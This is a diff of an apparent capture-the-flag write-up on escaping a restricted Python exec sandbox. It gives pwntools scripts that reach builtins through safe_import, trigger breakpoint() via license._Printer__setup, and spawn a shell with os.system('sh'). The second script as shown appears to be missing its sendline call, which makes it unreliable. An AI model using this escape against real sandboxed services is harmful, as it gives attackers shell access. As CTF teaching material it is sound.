@@ -37,16 +37,18 @@ exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import
 Requirements:
 
 1. No function call: Use `f"{license}" for license._Printer__setup in [function_to_call]]` to call `function_to_call`
-2. No builtins: Use `.__globals__["__builtins__"]` of the given function to access builtins
+2. No builtins: Use `.__builtins__` of the given function to access builtins dict, or `.__globals__["__builtins__"]` of the given function to access builtins module
 3. No assignment: Use `[a:=b]` for assignment
 
 Inspired by [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/#running-functions-and-methods-without-parenthesis).
 
 We want to call `breakpoint()`, so:
 
-1. Get builtins from `safe_import`: `builtins = safe_import.__globals__["__builtins__"]`, to avoid assignment, use `[builtins:=safe_import.__globals__["__builtins__"]]`
-2. Get license and breakpoint from builtins: `[...,breakpoint:=builtins.breakpoint,license:=builtins.license]`
+1. Get builtins from `safe_import`: `builtins = safe_import.__globals__["__builtins__"]`, to avoid assignment, use `[builtins:=safe_import.__globals__["__builtins__"]]`; alternatively, use `[builtins:=safe_import.__builtins__]` which is a dict instead of module
+2. Get license and breakpoint from builtins module: `[...,breakpoint:=builtins.breakpoint,license:=builtins.license]`, or from builtins dict: `[...,breakpoint:=builtins["breakpoint"],license:=builtins["license"]]`
 3. Call breakpoint via `license._Printer__setup`: `[f"{license}" for license._Printer__setup in [breakpoint]]`
+
+Attack script using builtins module `safe_import.__globals__["__builtins__"]`:
 
 ```python
 from pwn import *
@@ -57,6 +59,25 @@ p = process(["python3", "astea.py"])
 p.recvuntil(b"morning:")
 p.sendline(
     '[builtins:=safe_import.__globals__["__builtins__"],breakpoint:=builtins.breakpoint,license:=builtins.license,[f"{license}" for license._Printer__setup in [breakpoint]]]'.encode()
+)
+p.recvuntil(b"(Pdb) ")
+p.sendline(b"import os")
+p.sendline(b"os.system('sh')")
+
+p.interactive()
+```
+
+Using builtins dict `safe_import.__builtins__`:
+
+```python
+from pwn import *
+
+context(log_level="debug")
+
+p = process(["python3", "astea.py"])
+p.recvuntil(b"morning:")
+    #'[builtins:=safe_import.__globals__["__builtins__"],breakpoint:=builtins.breakpoint,license:=builtins.license,[f"{license}" for license._Printer__setup in [breakpoint]]]'.encode()
+    '[builtins:=safe_import.__builtins__,breakpoint:=builtins["breakpoint"],license:=builtins["license"],[f"{license}" for license._Printer__setup in [breakpoint]]]'.encode()
 )
 p.recvuntil(b"(Pdb) ")
 p.sendline(b"import os")
